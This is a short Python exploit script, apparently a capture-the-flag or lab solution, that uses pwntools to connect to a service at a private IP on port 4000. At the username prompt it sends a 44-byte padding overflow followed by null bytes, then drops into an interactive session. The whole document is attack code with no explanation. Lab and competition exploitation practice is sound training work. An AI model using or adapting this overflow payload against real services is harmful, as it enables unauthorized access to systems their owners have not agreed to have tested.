import pwn

def exploit():
    conn = pwn.remote("172.25.106.194",4000)
    while conn.can_recv(timeout=1):
        conn.sendlineafter("username:",'A'*44+'\x00\x00\x00\x00')
        conn.interactive()

exploit()